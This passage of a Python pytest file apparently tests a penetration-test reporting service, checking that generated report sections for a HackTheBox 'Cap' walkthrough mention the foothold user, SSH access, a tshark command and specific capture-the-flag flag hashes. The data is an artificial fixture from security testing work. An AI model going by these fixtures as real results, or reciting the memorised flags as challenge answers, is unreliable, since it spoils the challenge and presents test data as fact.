    assert "391aad4e9ee903704a5c0208a52afdd7" in rendered


@pytest.mark.anyio
async def test_deterministic_reporting_provider_infers_foothold_and_flags_from_commands_and_graph(
    test_db: AsyncSession,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    project, user = await _create_project_with_user(
        test_db,
        tmp_path,
        project_id="project-cap-inferred-artifacts",
    )
    session = await _create_session(
        test_db,
        project.id,
        session_id="session-cap-inferred-artifacts",
    )
    report_service = ReportService(test_db)
    report = await report_service.ensure_report(project.id, "HTB Cap Canonical Flow")
    await report_service.seed_default_sections(report.id)
    await _seed_cap_reporting_evidence(
        test_db,
        project_id=project.id,
        session_id=session.id,
        user_id=user.id,
        include_structured_artifacts=False,
    )
    monkeypatch.setenv("PWNPILOT_FAKE_REPORTING_PROVIDER", "deterministic")

    service = ReportGenerationService(test_db)
    proposal = await service.generate_update_proposal(
        project_id=project.id,
        user_id=user.id,
        trigger_type="manual",
    )

    assert proposal is not None

    patches = (
        await test_db.execute(
            select(ReportUpdateSectionPatchDB)
            .where(ReportUpdateSectionPatchDB.proposal_id == proposal.id)
        )
    ).scalars().all()
    patches_by_key = {patch.section_key: patch for patch in patches}

    assert set(patches_by_key) >= {
        "overview",
        "attack_path",
        "enumeration",
        "foothold",
        "privilege_escalation",
        "flags_evidence",
        "command_timeline",
    }
    assert "nathan" in patches_by_key["foothold"].content_md.lower()
    assert "ssh" in patches_by_key["foothold"].content_md.lower()
    assert "user.txt" in patches_by_key["foothold"].content_md
    assert "b2caf1abb00bdcb51aca6a6eda2d12e8" in patches_by_key["flags_evidence"].content_md
    assert "391aad4e9ee903704a5c0208a52afdd7" in patches_by_key["flags_evidence"].content_md
    assert "Credential: nathan" in patches_by_key["attack_path"].content_md
    assert 'tshark -r 0.pcap' in patches_by_key["command_timeline"].content_md
